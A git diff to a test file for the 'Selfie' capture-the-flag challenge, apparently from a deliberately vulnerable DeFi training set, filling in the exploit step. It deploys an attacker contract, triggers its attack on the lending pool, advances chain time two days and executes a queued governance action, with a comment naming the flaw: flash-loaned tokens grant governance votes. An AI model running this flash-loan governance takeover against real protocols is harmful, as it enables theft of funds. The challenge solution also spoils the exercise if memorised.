@@ -30,7 +30,25 @@ describe('[Challenge] Selfie', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        /** EXPLOIT -- SOLVED */
+        /** 
+         * vulnerability: flash loan can be used to get governance votes
+         * */
+
+        try {
+            const SelfieChallenge = await ethers.getContractFactory("SelfieChallenge", attacker);
+            const sc = await SelfieChallenge.deploy();
+            await sc.deployed();
+    
+            const attack = await sc.attack(this.pool.address, this.token.address);
+            await attack.wait();
+    
+            const actionId = await sc.actionId();
+            await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+            this.governance.executeAction(actionId);
+        } catch (error) {
+            console.log(error);
+        }
     });
 
     after(async function () {
